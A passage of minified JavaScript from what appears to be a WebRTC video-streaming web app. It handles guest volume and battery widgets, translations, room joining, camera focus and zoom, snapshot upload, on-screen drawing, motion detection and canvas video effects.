anslation("battery-meter"),holder.appendChild(session.rpcs[vid.dataset.UUID].batteryMeter),holder.batteryMeter=session.rpcs[vid.dataset.UUID].batteryMeter):vid.dataset.UUID&&session.rpcs[vid.dataset.UUID].batteryMeter&&(holder.batteryMeter||(holder.appendChild(session.rpcs[vid.dataset.UUID].batteryMeter),holder.batteryMeter=session.rpcs[vid.dataset.UUID].batteryMeter))),session.volumeControl&&session.rpcs[vid.dataset.UUID].videoElement&&"VIDEO"!=vid.tagName&&(vid.dataset.UUID&&!session.rpcs[vid.dataset.UUID].volumeControl?(session.rpcs[vid.dataset.UUID].volumeControl=getById("volumeControlTemplate").cloneNode(!0),session.rpcs[vid.dataset.UUID].volumeControl.classList.remove("hidden"),session.rpcs[vid.dataset.UUID].volumeControl.id="volumeControl_"+vid.dataset.UUID,session.rpcs[vid.dataset.UUID].volumeControl.value=parseInt(100*session.rpcs[vid.dataset.UUID].videoElement.volume),session.rpcs[vid.dataset.UUID].volumeControl.dataset.UUID=vid.dataset.UUID,session.rpcs[vid.dataset.UUID].volumeControl.title=getTranslation("volume-control"),session.rpcs[vid.dataset.UUID].volumeControl.oninput=function(){this.dataset.UUID&&session.rpcs[this.dataset.UUID]&&session.rpcs[this.dataset.UUID].videoElement&&(session.rpcs[this.dataset.UUID].videoElement.volume=parseFloat(this.value/100))},holder.appendChild(session.rpcs[vid.dataset.UUID].volumeControl),holder.volumeControl=session.rpcs[vid.dataset.UUID].volumeControl):vid.dataset.UUID&&session.rpcs[vid.dataset.UUID].volumeControl&&!holder.volumeControl&&session.rpcs[vid.dataset.UUID].videoElement&&(holder.appendChild(session.rpcs[vid.dataset.UUID].volumeControl),holder.volumeControl=session.rpcs[vid.dataset.UUID].volumeControl,session.rpcs[vid.dataset.UUID].volumeControl.value=parseInt(100*session.rpcs[vid.dataset.UUID].videoElement.volume))),session.showConnections&&(session.rpcs[vid.dataset.UUID].connectionDetails||createConnectionDetailsEle(vid.dataset.UUID),holder.appendChild(session.rpcs[vid.dataset.UUID].connectionDetails))),session.ruleOfThirds&&"videosource"==vid.id&&!holder.svg){var svg=document.createElement("img");svg.src=session.ruleOfThirds,svg.style.width="100%",svg.style.height="100%",svg.style.position="absolute",svg.style.left="0",svg.style.top="0",svg.style.pointerEvents="none",holder.svg=svg,holder.appendChild(svg)}try{if((!session.cleanOutput||0!=session.cleanish)&&!1===session.firstPlayTriggered&&"video"==vid.tagName.toLowerCase()&&vid.paused){warnlog("VIDEO IS NOT PLAYING");var playPromise=vid.play();void 0!==playPromise?playPromise.then((_=>{})).catch((err=>{var bigPlayButton=document.getElementById("bigPlayButton");bigPlayButton&&(bigPlayButton.innerHTML='<span class="playButton"></span>',bigPlayButton.style.display="block")})):session.firstPlayTriggered=!0}}catch(e){errorlog(e);var bigPlayButton=document.getElementById("bigPlayButton");bigPlayButton&&bigPlayButton.parentNode.removeChild(bigPlayButton)}if("IFRAME"==vid.nodeName)return void(i+=1);if(!session.cleanOutput&&!session.nocursor&&!1!==session.roomid&&!1===session.scene)if("videosource"===vid.id&&miniPreview||session.infocusForceMode){if("videosource"===vid.id&&miniPreview&&1==soloVideo&&!session.infocusForceMode){if(holder.button)button=holder.button;else{button=document.createElement("div");holder.button=button,holder.appendChild(button)}button.id="button_videosource",button.dataset.button=!0,soloVideo?(button.innerHTML="<img src='./media/sd.svg' class='fullwindowButtonimg' aria-hidden='true' />",button.title="Show all active videos togethers",button.style.display="unset"):(button.style.visibility="hidden",button.style.display="none"),button.classList.add("fullwindowButton"),button.onclick=function(event){event.stopPropagation(),event.preventDefault(),!0===session.infocus&&(session.infocus=!1,setTimeout((()=>updateMixer()),10)),session.fullscreenButton&&(session.infocus?fullscreenPageToggle(!0):fullscreenPageToggle(!1))}}else if(session.infocusForceMode&&holder.button)try{holder.button.remove()}catch(e){errorlog(e)}}else{if(holder.button)var button=holder.button;else{var button=document.createElement("div");holder.button=button,holder.appendChild(button)}button.id="button_"+vid.id,button.dataset.button=!0,soloVideo?(button.innerHTML="<img src='./media/sd.svg'  class='fullwindowButtonimg' aria-hidden='true' />",button.title="Show all active videos togethers",button.style.visibility="visible"):mpl>1||session.fullscreenButton?(button.innerHTML="<img src='./media/hd.svg' class='fullwindowButtonimg' aria-hidden='true' />",button.title="Enlarge video and increase its clarity",button.style.visibility="visible"):button.style.visibility="hidden",button.classList.add("fullwindowButton"),"videosource"==vid.id?button.onclick=function(event){!0===session.infocus?session.infocus=!1:session.infocus=!0,setTimeout((()=>updateMixer()),10),session.fullscreenButton&&(session.infocus?fullscreenPageToggle(!0):fullscreenPageToggle(!1))}:(button.dataset.UUID=vid.dataset.UUID,button.onclick=function(event){var target=event.currentTarget;session.infocus===target.dataset.UUID?session.infocus=!1:session.infocus=target.dataset.UUID,session.fullscreenButton&&(session.infocus?fullscreenPageToggle(!0):fullscreenPageToggle(!1)),setTimeout((()=>updateMixer()),10)}),vid.onclick=function(event){session.disableMouseEvents||(button.style.display="block",container.style.backgroundColor="#4444",button.style.opacity="100%")},button.onmouseenter=function(event){session.disableMouseEvents||(button.style.display="block",container.style.backgroundColor="#4444",setTimeout((function(button){button.style.opacity="100%"}),1,button))},button.onmousemove=function(event){session.disableMouseEvents||(button.style.display="block",container.style.backgroundColor="#4444",button.style.opacity="100%")},container.onmousemove=function(event){session.disableMouseEvents||(button.style.display="block",container.style.backgroundColor="#4444",button.style.opacity="100%")},container.onmouseenter=function(event){session.disableMouseEvents||(button.style.display="block",container.style.backgroundColor="#4444",setTimeout((function(button){button.style.opacity="100%"}),1,button))},container.onmouseleave=function(event){session.disableMouseEvents||(button.style.display="none",container.style.backgroundColor=null,button.style.opacity="10%")}}i+=1}catch(err){errorlog(err)}})),updateUserList()}var translationBacklog=[];function miniTranslate(ele,ident=!1,direct=!1){if(translation||(translation={}),ident){if(translation.innerHTML&&ident in translation.innerHTML)return void(ele.querySelector("[data-translate]")?(ele.querySelector("[data-translate]").innerHTML=translation.innerHTML[ident],ele.querySelector("[data-translate]").dataset.translate=ident):(ele.innerHTML=translation.innerHTML[ident],ele.dataset.translate=ident));if(direct)return void(ele.querySelector("[data-translate]")?(ele.querySelector("[data-translate]").innerHTML=direct,ele.querySelector("[data-translate]").dataset.translate=ident):(ele.dataset.translate=ident,ele.innerHTML=direct));if(ident in miscTranslations)value=miscTranslations[ident];else var value=ident.replaceAll("-"," ");ele.querySelector("[data-translate]")?(ele.querySelector("[data-translate]").innerHTML=value,ele.querySelector("[data-translate]").dataset.translate=ident):(ele.innerHTML=value,ele.dataset.translate=ident)}else{if(ele.querySelectorAll("[data-translate]").forEach((function(ele2){translation.innerHTML&&ele2.dataset.translate in translation.innerHTML?ele2.innerHTML=translation.innerHTML[ele2.dataset.translate]:translation.miscellaneous&&ele2.dataset.translate in translation.miscellaneous&&(ele2.innerHTML=translation.miscellaneous[ele2.dataset.translate])})),ele.dataset&&(translation.innerHTML&&ele.dataset.translate in translation.innerHTML?ele.innerHTML=translation.innerHTML[ele.dataset.translate]:translation.miscellaneous&&ele.dataset.translate in translation.miscellaneous&&(ele.innerHTML=translation.miscellaneous[ele.dataset.translate])),translation.titles)if(ele.querySelectorAll("[title]").forEach((function(ele2){if(ele.dataset.key)var key=ele2.dataset.key;else{key=ele2.title.replace(/[\W]+/g,"-").toLowerCase();ele2.dataset.key=key}key in translation.titles?ele2.title=translation.titles[key]:ele2.dataset.translate&&ele2.dataset.translate in translation.titles&&(ele2.title=translation.titles[ele2.dataset.translate])})),ele.title){if(ele.dataset.key)var key=ele.dataset.key;else{var key=ele.title.replace(/[\W]+/g,"-").toLowerCase();ele.dataset.key=key}key in translation.titles?ele.title=translation.titles[key]:ele.dataset.translate&&ele.dataset.translate in translation.titles&&(ele.title=translation.titles[ele.dataset.translate])}if(translation.placeholders)if(ele.querySelectorAll("[placeholder]").forEach((function(ele2){var key=ele2.placeholder.replace(/[\W]+/g,"-").toLowerCase();key in translation.placeholders&&(ele2.placeholder=translation.placeholders[key])})),ele.placeholder)(key=ele.placeholder.replace(/[\W]+/g,"-").toLowerCase())in translation.placeholders&&(ele.placeholder=translation.placeholders[key])}}var controlBarTimeout=!1;function showControl(e){controlBarTimeout&&clearTimeout(controlBarTimeout),session.mobile?getById("controlButtons").classList.remove("partialFadeout"):getById("controlButtons").classList.remove("fadeout"),controlBarTimeout=setTimeout((function(){session.mobile?getById("controlButtons").classList.add("partialFadeout"):getById("controlButtons").classList.add("fadeout")}),5e3)}async function changeLg(lang){log("changeLg: "+lang),await fetchWithTimeout("./translations/"+lang+".json",2e3).then((async function(response){try{if(200!==response.status)return void(getById("mainmenu").style.opacity=1);await response.json().then((async function(data){if((translation=data).miscellaneous&&Object.keys(translation.miscellaneous).forEach((key=>{miscTranslations[key]=translation.miscellaneous[key]})),translation.miscellaneous=miscTranslations,document.querySelectorAll("[data-translate]").forEach((function(ele){ele.dataset.translate in translation.innerHTML?ele.innerHTML=translation.innerHTML[ele.dataset.translate]:translation.miscellaneous&&ele.dataset.translate in translation.miscellaneous&&(ele.innerHTML=translation.miscellaneous[ele.dataset.translate])})),document.querySelectorAll("[title]").forEach((function(ele){if(ele.dataset.key)var key=ele.dataset.key;else{key=ele.title.replace(/[\W]+/g,"-").toLowerCase();ele.dataset.key=key}key in translation.titles?ele.title=translation.titles[key]:ele.dataset.translate&&translation.titles&&ele.dataset.translate in translation.titles&&(ele.title=translation.titles[ele.dataset.translate])})),document.querySelectorAll("[placeholder]").forEach((function(ele){var key=ele.placeholder.replace(/[\W]+/g,"-").toLowerCase();key in translation.placeholders&&(ele.placeholder=translation.placeholders[key])})),translationBacklog.length){for(var i=0;i<translationBacklog.length;i++)try{miniTranslate(translationBacklog[i][0],translationBacklog[i][1])}catch(e){}translationBacklog=[]}getById("mainmenu").style.opacity=1}))}catch(e){getById("mainmenu").style.opacity=1}})).catch((function(err){errorlog(err)}))}var loadedQRCode=!1;function loadQR(callback=!1,value=!1){if(!1===loadedQRCode){loadedQRCode=!0;var script=document.createElement("script");callback&&(script.onload=function(){callback(value)}),script.src="./thirdparty/qrcode.min.js",document.head.appendChild(script)}else callback&&callback(value)}var eventMethod=window.addEventListener?"addEventListener":"attachEvent",eventer=window[eventMethod],messageEvent="attachEvent"===eventMethod?"onmessage":"message";function requestMirrorGuest(ele){var data,UUID=ele.dataset.UUID;1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",applyMirrorGuest(!1,session.rpcs[UUID].videoElement),(data={mirrorGuestState:!1}).mirrorGuestTarget=UUID,session.sendPeers(data,!1,UUID),data.mirrorGuestTarget=!0,session.sendPeers(data,UUID)):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",applyMirrorGuest(!0,session.rpcs[UUID].videoElement),(data={mirrorGuestState:!0}).mirrorGuestTarget=UUID,session.sendPeers(data,!1,UUID),data.mirrorGuestTarget=!0,session.sendPeers(data,UUID))}function requestKeyframeScene(ele){var UUID=ele.dataset.UUID;1==ele.value||(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",session.requestKeyframe(UUID,!0),setTimeout((function(el){el.value=0,el.classList.remove("pressed"),el.ariaPressed="false"}),1e3,ele))}function pokeIframeAPI(action,value=null,UUID=null,SID=null){if(isIFrame)try{var data={};data.action=action,null!==value&&(data.value=value),null!==UUID&&(data.UUID=UUID),SID||UUID&&UUID in session.rpcs&&session.rpcs[UUID].streamID&&(SID=session.rpcs[UUID].streamID),SID||UUID&&UUID in session.pcs&&session.pcs[UUID].streamID&&(SID=session.pcs[UUID].streamID),SID&&(data.streamID=SID),isIFrame&&parent.postMessage(data,session.iframetarget)}catch(e){errorlog(e)}}async function jumptoroom2(){var arr=window.location.href.split("?"),roomname=getById("videoname1").value;if((roomname=sanitizeRoomName(roomname)).length){var pass=getById("passwordRoom").value,passStr="";(pass=sanitizePassword(pass))&&pass.length&&(passStr="&password="+pass),arr.length>1&&""!==arr[1]?window.location+="&room="+roomname+passStr+"&host":window.location+="?room="+roomname+passStr+"&host"}else getById("videoname1").focus(),getById("videoname1").classList.remove("shake"),setTimeout((function(){getById("videoname1").classList.add("shake")}),10)}async function jumptoroom(event=null){if(!event||13===event.which){var arr=window.location.href.split("?"),roomname=getById("joinroomID").value;if((roomname=sanitizeRoomName(roomname)).length){var passStr="";window.focus();var pass=await promptAlt("Enter a password if provided, otherwise just click Cancel",!1,!0);pass&&pass.length?(session.password=sanitizePassword(pass),passStr="&password="+session.password):session.password=!1,arr.length>1&&""!==arr[1]?window.location+="&room="+roomname+passStr:window.location+="?room="+roomname+passStr}else getById("joinroomID").focus(),getById("joinroomID").classList.remove("shake"),setTimeout((function(){getById("joinroomID").classList.add("shake")}),10)}}async function jumptoURL(event=null){var url=getById("joinbyURL").value;url.length?(url.startsWith("?")&&(url="./"+url),url.startsWith("&")&&(url="./?"+url),url.startsWith("http")||url.startsWith(".")||(url="./?"+url),setStorage("jumptoURL",url,1008),window.location=url):(getById("joinbyURL").focus(),getById("joinbyURL").classList.remove("shake"),setTimeout((function(){getById("joinbyURL").classList.add("shake")}),10))}function sleep(ms=0){return new Promise((r=>setTimeout(r,ms)))}function sleepCancellable(ms=0){let resolve;return{promise:new Promise((r=>{resolve=r,setTimeout(resolve,ms)})),resolve:resolve}}async function changeAvatarImage(ev,ele,set=!1){if(log("changeAvatarImage() triggered"),session.avatar&&session.avatar.timer&&(clearInterval(session.avatar.timer),session.avatar.timer=null),session.streamSrc||checkBasicStreamsExist(),ele.files&&ele.files.length)return session.avatar=document.querySelector("img"),session.avatar.ready=!1,session.avatar.onload=()=>{URL.revokeObjectURL(session.avatar.src),session.avatar.ready=!0,getById("noAvatarSelected3").classList.remove("selected"),getById("noAvatarSelected").classList.remove("selected"),getById("defaultAvatar1").classList.add("selected"),getById("defaultAvatar2").classList.add("selected"),session.streamSrc.getVideoTracks().length&&!session.videoMuted||updateRenderOutpipe()},void(session.avatar.src=URL.createObjectURL(ele.files[0]));if("img"!=ele.tagName.toLowerCase()){if(session.avatar=!1,!session.streamSrc.getVideoTracks().length||session.videoMuted){var msg={videoMuted:!0};session.sendMessage(msg),document.getElementById("videosource")?document.getElementById("videosource").load():document.getElementById("previewWebcam")&&document.getElementById("previewWebcam").load(),updateRenderOutpipe()}return getById("noAvatarSelected3").classList.add("selected"),getById("noAvatarSelected").classList.add("selected"),getById("defaultAvatar1").classList.remove("selected"),void getById("defaultAvatar2").classList.remove("selected")}session.avatar=ele,session.avatar.ready=!0,getById("noAvatarSelected3").classList.remove("selected"),getById("noAvatarSelected").classList.remove("selected"),getById("defaultAvatar1").classList.add("selected"),getById("defaultAvatar2").classList.add("selected"),session.streamSrc.getVideoTracks().length&&!session.videoMuted||updateRenderOutpipe()}function setupSharpnessTool(){var promise;const worker=new Worker("./thirdparty/focus_worker.js",{type:"module"});worker.onerror=event=>{errorlog(event),promise.reject(event)},worker.onmessage=messageEvent=>{log("Sharpness score: "+messageEvent.data.score.avg_edge_width_perc),promise.resolve(messageEvent.data.score.avg_edge_width_perc)},measureBlur=imageData=>{worker.postMessage({imageData:imageData})};const canvas=document.createElement("canvas");return async function getSharpness(x=50,y=50){if(session.videoElement){log("XY"),log(x+" : "+y),canvas.width=session.videoElement.videoWidth/5,canvas.height=session.videoElement.videoHeight/5,x<10&&(x=10),y<10&&(y=10),x>90&&(x=90),y>90&&(y=90);var sx=session.videoElement.videoWidth/100*(x-10),sy=session.videoElement.videoHeight/100*(y-10),sw=.2*session.videoElement.videoWidth,sh=.2*session.videoElement.videoHeight;canvas.getContext("2d").filter="blur(3px)",canvas.getContext("2d").drawImage(session.videoElement,sx,sy,sw,sh,0,0,canvas.width,canvas.height);const canvasData=canvas.getContext("2d").getImageData(0,0,canvas.width,canvas.height);var res,rej;return(promise=new Promise(((resolve,reject)=>{res=resolve,rej=reject}))).resolve=res,promise.reject=rej,measureBlur(canvasData),promise}return null}}eventer(messageEvent,(function(e){try{"https://www.youtube.com"==e.origin?processYoutubeEvent(e):e.data&&"object"==typeof e.data&&"action"in e.data&&("screen-share-state"!=e.data.action||e.data.value?"video-loaded"==e.data.action&&(warnlog(e),toggleSpeakerMute(!0),updateMixer()):session.screenShareElement&&session.screenShareElement.contentWindow&&e.source==session.screenShareElement.contentWindow&&(warnlog(e),postMessageIframe(session.screenShareElement,{close:!0}),session.screenShareElement.parentNode.removeChild(session.screenShareElement),session.screenShareElement=!1,updateMixer()))}catch(e){errorlog(e)}})),session.autoSyncCallback=function(UUID=null){log(session.autoSyncObject),pokeIframeAPI("auto-sync-updated",session.autoSyncObject,UUID)},session.autoSync=function(alternative=null){var msg={};null===alternative||(session.autoSyncObject=alternative),msg.autoSync=session.autoSyncObject,session.sendPeers(msg)};var sharpnessToolActive=!1,sharpnessTool=!1;async function tapToFocus(x,y,force=!1){if(!isNaN(x)&&!isNaN(y)&&!sharpnessToolActive)if(session.streamSrc){var track0=session.streamSrc.getVideoTracks();if(track0.length)if((track0=track0[0]).getCapabilities){var capabilities=track0.getCapabilities();if("focusDistance"in capabilities){var settings=track0.getSettings();if(!("focusMode"in settings)||force||"manual"===settings.focusMode){sharpnessTool||(sharpnessTool=setupSharpnessTool());var bestFocus=-1,bestSharpness=999;sharpnessToolActive=!0;try{log("Current focus distance: "+capabilities.focusDistance),await track0.applyConstraints({advanced:[{focusMode:"manual",focusDistance:capabilities.focusDistance.min}]}),await sleep(250);var stepping=capabilities.focusDistance.step||.1;(capabilities.focusDistance.max-capabilities.focusDistance.min)/stepping>100&&(stepping=parseInt((capabilities.focusDistance.max-capabilities.focusDistance.min)/100)),stepping||(stepping=.1);for(var i=capabilities.focusDistance.min;i<=capabilities.focusDistance.max;i+=stepping){await track0.applyConstraints({advanced:[{focusMode:"manual",focusDistance:i}]}),await sleep(120),log("focus: "+i+", "+x+"x"+y);var response=await sharpnessTool(x,y);if(response&&response<bestSharpness)bestSharpness=response,bestFocus=i;else if(null===response)return;log(response+" "+bestSharpness+" "+bestFocus+" "+i+" "+capabilities.focusDistance.max)}-1!==bestFocus&&(log("Setting focus now to: "+bestFocus),await track0.applyConstraints({advanced:[{focusMode:"manual",focusDistance:bestFocus}]}))}catch(e){errorlog(e)}sharpnessToolActive=!1}else log("Need to be in manual focus mode")}else log("Track doesn't support focusing")}else log("Track lacks advanced features. Firefox?");else log("No video tracks")}else checkBasicStreamsExist()}function uploadImageSnapshot(PostURL){if(!session.videoElement)return;const video=session.videoElement,canvas=document.createElement("canvas");canvas.width=video.videoWidth,canvas.height=video.videoHeight,canvas.getContext("2d").drawImage(video,0,0,video.videoWidth,video.videoHeight);const playImage=new Image;canvas.getContext("2d").drawImage(playImage,0,0,playImage.width,playImage.height),canvas.toBlob((function(blob){var request=new XMLHttpRequest;PostURL.includes("?")?request.open("POST",PostURL+"&name="+session.streamID):request.open("POST",PostURL+"?name="+session.streamID),request.setRequestHeader("Content-Type","image/jpeg"),request.send(blob),log("Posted image")}),"image/jpeg",.9)}session.remoteZoom=function(zoom){try{var track0=session.streamSrc.getVideoTracks();if((track0=track0[0]).getCapabilities){var capabilities=track0.getCapabilities();if(!capabilities.zoom)return void warnlog("No zoom supported on this device");if("min"in capabilities.zoom&&"max"in capabilities.zoom)return void(capabilities.zoom.max===capabilities.zoom.min&&warnlog("zoom only has one fixed setting"));0==session.zoom&&(session.zoom=capabilities.zoom.min),session.zoom+=zoom,session.zoom>capabilities.zoom.max?session.zoom=capabilities.zoom.max:session.zoom<capabilities.zoom.min&&(session.zoom=capabilities.zoom.min),track0.applyConstraints({advanced:[{zoom:session.zoom}]})}else Firefox&&warnlog("firefox sucks. that's why")}catch(e){errorlog(e)}},session.remoteFocus=async function(focusDistance){try{var track0=session.streamSrc.getVideoTracks();if((track0=track0[0]).getCapabilities){var capabilities=track0.getCapabilities();if(!capabilities.focusDistance)return void warnlog("No Focus supported on this device");if(!("min"in capabilities.focusDistance))return;0==session.focusDistance&&(session.focusDistance=capabilities.focusDistance.min),session.focusDistance+=focusDistance,session.focusDistance>capabilities.focusDistance.max?session.focusDistance=capabilities.focusDistance.max:session.focusDistance<capabilities.focusDistance.min&&(session.focusDistance=capabilities.focusDistance.min),await track0.applyConstraints({advanced:[{focusMode:"manual",focusDistance:session.focusDistance}]})}}catch(e){errorlog(e)}};var slideshowImage=!1,slideshowCanvas=!1,slideshowActive=!1;function slideshowHack(){if(session.manual||(session.manual=!0),!slideshowActive){slideshowActive=!0;try{slideshowImage||((slideshowImage=document.createElement("img")).style.width="100%",slideshowImage.style.height="100%",slideshowImage.style.objectFit="contain",slideshowImage.style.border="0",slideshowImage.style.padding="0",slideshowImage.style.margin="0",getById("gridlayout").innerHTML="",getById("gridlayout").appendChild(slideshowImage));var keys=Object.keys(session.rpcs);if(!keys.length)return void(slideshowActive=!1);for(var video=!1,key=!1,i=0;i<keys.length;i++)if(session.rpcs[keys[i]].videoElement){key=keys[i],video=session.rpcs[keys[i]].videoElement;break}if(!video)return slideshowCanvas=!1,void(slideshowActive=!1);slideshowCanvas||((slideshowCanvas=document.createElement("canvas")).getContext("2d").imageSmoothingEnabled=!1,session.requestResolution(key,session.viewwidth||480,session.viewheight||480)),slideshowCanvas.width=video.videoWidth,slideshowCanvas.height=video.videoHeight,slideshowCanvas.getContext("2d").drawImage(video,0,0,video.videoWidth,video.videoHeight);var image=slideshowCanvas.toDataURL("image/png").replace("image/png","image/octet-stream");slideshowImage.src=image}catch(e){errorlog(e)}slideshowActive=!1}}function setAvatarImage(tracks){if(session.avatar&&session.avatar.ready){session.avatar&&session.avatar.timer&&(clearInterval(session.avatar.timer),session.avatar.timer=null),setupCanvas();var width=512,height=288,maxW=1280,maxH=720;return 0==session.quality?(maxW=1920,maxH=1080):2==session.quality&&(maxW=640,maxH=360),session.width&&(maxW=session.width),session.height&&(maxH=session.height),session.avatar.naturalHeight&&session.avatar.naturalHeight>maxH?(height=maxH,(width=parseInt(maxH/session.avatar.naturalHeight*session.avatar.naturalWidth))>maxW&&(width=maxW,height=parseInt(maxW/width*height))):session.avatar.naturalWidth&&session.avatar.naturalWidth>maxW?(width=maxW,height=parseInt(maxW/session.avatar.naturalWidth*session.avatar.naturalHeight)):(width=session.avatar.naturalWidth,height=session.avatar.naturalHeight),session.canvasSource.width=width,session.canvasSource.height=height,session.canvas.height=2*parseInt(height/2),session.canvas.width=2*parseInt(width/2),session.canvasCtx.drawImage(session.avatar,0,0,session.canvas.width,session.canvas.height),session.avatar.timer=setInterval((function(){log("drawing"),session.canvasCtx.drawImage(session.avatar,0,0,session.canvas.width,session.canvas.height)}),200),applyMirror(!0),session.avatar.tracks=session.canvas.captureStream().getVideoTracks(),session.avatar.tracks}return applyMirror(session.mirrorExclude),tracks}var drawOnScreenObject=null;function drawOnScreen(){var canvas=document.getElementById("drawOnSCreen");if(!canvas){canvas=document.createElement("canvas"),getById("gridlayout").appendChild(canvas),getById("gridlayout").style.position="relative";var ctx=canvas.getContext("2d");canvas.width=parseInt(getById("gridlayout").clientWidth/2),canvas.height=parseInt(getById("gridlayout").clientHeight/2),canvas.style.width="100%",canvas.style.height="100%",canvas.style.display="block",canvas.style.position="absolute",canvas.style.bottom="0",canvas.style.left="0";var flag=!1,prevX=0,currX=0,prevY=0,currY=0,x="black",y=2,object={stop:function stop(){canvas.removeEventListener("mousemove",(function(e){findxy("move",e)}),!1),canvas.removeEventListener("mousedown",(function(e){findxy("down",e)}),!1),canvas.removeEventListener("mouseup",(function(e){findxy("up",e)}),!1),canvas.removeEventListener("mouseout",(function(e){findxy("out",e)}),!1),canvas.remove(),getById("startDrawScreen").classList.remove("hidden"),document.querySelectorAll(".drawActive").forEach((ele=>{ele.classList.add("hidden")})),delete canvas,drawOnScreenObject=null,object=null},init:function init(){canvas.addEventListener("mousemove",(function(e){findxy("move",e)}),!1),canvas.addEventListener("mousedown",(function(e){findxy("down",e)}),!1),canvas.addEventListener("mouseup",(function(e){findxy("up",e)}),!1),canvas.addEventListener("mouseout",(function(e){findxy("out",e)}),!1),getById("startDrawScreen").classList.add("hidden"),document.querySelectorAll(".drawActive").forEach((ele=>{ele.classList.remove("hidden")}))},color:function color(obj){switch(obj.dataset.color){case"green":x="green";break;case"blue":x="blue";break;case"red":x="red";break;case"yellow":x="yellow";break;case"orange":x="orange";break;case"black":x="black";break;case"white":x="white"}y="white"==x?14:2},erase:function erase(){ctx.clearRect(0,0,canvas.width,canvas.height)},save:function save(){canvas.toDataURL()}};return object.init(),drawOnScreenObject=object,object}function findxy(res,e){"down"==res&&(prevX=currX,prevY=currY,currX=e.clientX-canvas.offsetLeft,currY=e.clientY-canvas.offsetTop,flag=!0,!0&&(ctx.beginPath(),ctx.fillStyle=x,ctx.fillRect(currX,currY,2,2),ctx.closePath(),!1)),"up"!=res&&"out"!=res||(flag=!1),"move"==res&&flag&&(prevX=currX,prevY=currY,currX=e.clientX-canvas.offsetLeft,currY=e.clientY-canvas.offsetTop,function draw(){ctx.beginPath();var mx=canvas.width/parseInt(getById("gridlayout").clientWidth),my=canvas.height/parseInt(getById("gridlayout").clientHeight),mo=parseInt(getById("header").clientHeight);ctx.moveTo(prevX*mx,prevY*my-mo*my),ctx.lineTo(currX*mx,currY*my-mo*my),ctx.strokeStyle=x,ctx.lineWidth=y,ctx.stroke(),ctx.closePath()}())}}function audioTimerLoop(callback,fps=40){fps+=5;var aCtx=new AudioContext,silence=aCtx.createGain();silence.gain.value=0,silence.connect(aCtx.destination),function onOSCend(){osc=aCtx.createOscillator(),osc.onended=onOSCend,osc.connect(silence),osc.start(0),osc.stop(aCtx.currentTime+1/fps),callback(aCtx.currentTime),stopped&&(osc.onended=null)}();var stopped=!1;return function(){stopped=!0}}function drawFrameMirrored(mirror=!0,flip=!1){session.canvasCtx.save(),flip?mirror?(session.canvasCtx.scale(-1,-1),session.canvasCtx.drawImage(session.canvasSource,0,0,-1*session.canvas.width,-1*session.canvas.height)):(session.canvasCtx.scale(1,-1),session.canvasCtx.drawImage(session.canvasSource,0,0,session.canvas.width,-1*session.canvas.height)):mirror?(session.canvasCtx.scale(-1,1),session.canvasCtx.drawImage(session.canvasSource,0,0,-1*session.canvas.width,session.canvas.height)):session.canvasCtx.drawImage(session.canvasSource,0,0,session.canvas.width,session.canvas.height),session.canvasCtx.restore()}function motionDetection(video,threshold=15,sensitivity=75){if(!video.motionDetector){video.motionDetector={},video.motionDetector.canvas=document.createElement("canvas"),video.motionDetector.canvas.width=16,video.motionDetector.canvas.height=16;try{video.motionDetector.ctx=video.motionDetector.canvas.getContext("2d",{willReadFrequently:!0})}catch(e){video.motionDetector.ctx=video.motionDetector.canvas.getContext("2d")}video.motionDetector.previous=[];for(var y=0;y<16;y++)for(var x=0;x<16;x++)video.motionDetector.previous.push(0)}var motionDetector=video.motionDetector;motionDetector.ctx.drawImage(video,0,0,video.videoWidth,video.videoHeight,0,0,16,16);var data=motionDetector.ctx.getImageData(0,0,16,16).data,matches=0;for(y=0;y<16;y++)for(x=0;x<16;x++){var pos=16*y+x,pos2=3*pos,value=data[pos2]+data[pos2+1]+data[pos2+2];motionDetector.previous[pos]&&Math.abs(motionDetector.previous[pos]-value)>sensitivity&&(matches+=1),motionDetector.previous[pos]=value}matches>=threshold&&(log("MOTION DETECTED: "+matches),session.motionSwitch&&window.obsstudio&&window.obsstudio.setCurrentScene&&(changeSceneEnabled||session.obsState&&session.obsState.details&&session.obsState.details.thisScene&&session.obsState.details.currentScene&&session.obsState.details.thisScene!==session.obsState.details.currentScene.name&&window.obsstudio.setCurrentScene(session.obsState.details.thisScene)),pokeIframeAPI("motion-detected",!0,video.dataset.UUID||!0),session.infocus!==(video.dataset.UUID||!0)&&(session.layout||(session.infocus=video.dataset.UUID||!0,updateMixer())),session.motionRecord&&(session.motionRecordTimeout||(session.motionRecordTimeout=setTimeout((function(){session.motionRecordTimeout=null}),1e3),saveVideoFrameToClipboard(video))))}function setupCanvas(){if(log("SETUP CANVAS"),null===session.canvas){session.canvas=document.createElement("canvas"),session.canvas.width=512,session.canvas.height=288;try{session.canvasCtx=session.canvas.getContext("2d",{alpha:!0,willReadFrequently:!0})}catch(e){errorlog(e),session.canvasCtx=session.canvas.getContext("2d")}session.canvasCtx.fillStyle="blue",session.canvasCtx.fillRect(0,0,512,288),session.canvasSource=createVideoElement(),session.canvasSource.autoplay=!0,session.canvasSource.srcObject=createMediaStream(),session.canvasSource.id="effectsVideoSource",session.canvasSource.srcObject.getVideoTracks().length&&(session.canvasSource.width=session.canvasSource.srcObject.getVideoTracks()[0].getSettings().width||1280,session.canvasSource.height=session.canvasSource.srcObject.getVideoTracks()[0].getSettings().height||720),(iOS||iPad)&&(session.canvasSource.style.position="absolute",session.canvasSource.style.left="0",session.canvasSource.style.top="0",session.canvasSource.controls=session.showControls||!1,session.canvasSource.style.maxWidth="1px",session.canvasSource.style.maxHeight="1px",session.canvasSource.setAttribute("playsinline",""),document.body.appendChild(session.canvasSource))}else session.canvasSource.srcObject.getVideoTracks().forEach((function(trk){session.canvasSource.srcObject.removeTrack(trk)}))}function applyEffects(track){if(log("applyEffects()"),"0"==session.effect||!session.effect)return track;if("1"==session.effect)setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),drawFace();else if("7"==session.effect)setupCanvas(),session.canvasSource.srcObject.addTrack(track),session.canvasSource.width=track.getSettings().width||1280,session.canvasSource.height=track.getSettings().height||720,session.canvas.height=2*parseInt(session.canvasSource.height/2),session.canvas.width=2*parseInt(session.canvasSource.width/2),digitalZoom();else 